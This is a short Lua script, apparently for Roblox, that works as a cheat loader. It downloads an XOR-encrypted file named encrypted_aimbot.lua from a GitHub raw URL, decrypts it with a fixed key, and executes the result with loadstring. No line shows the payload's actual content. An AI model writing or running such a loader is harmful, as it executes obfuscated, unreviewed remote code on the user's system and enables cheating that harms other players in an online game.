-- Альтернатива с заменой bit32.bxor
local function bit32bxor(a, b)
    local result = 0
    for i = 0, 31 do
        local bitA = (a // 2^i) % 2
        local bitB = (b // 2^i) % 2
        result = result + (bitA ~= bitB and 2^i or 0)
    end
    return result
end

local function xorDecrypt(str, key)
    local result = ""
    for i = 1, #str do
        local byte = string.byte(str, i)
        result = result .. string.char(bit32bxor(byte, key))
    end
    return result
end

local encryptedCode = game:HttpGet("https://raw.githubusercontent.com/MwHvh/MICheat/main/encrypted_aimbot.lua")
local key = 42

local decryptedCode = xorDecrypt(encryptedCode, key)
loadstring(decryptedCode)()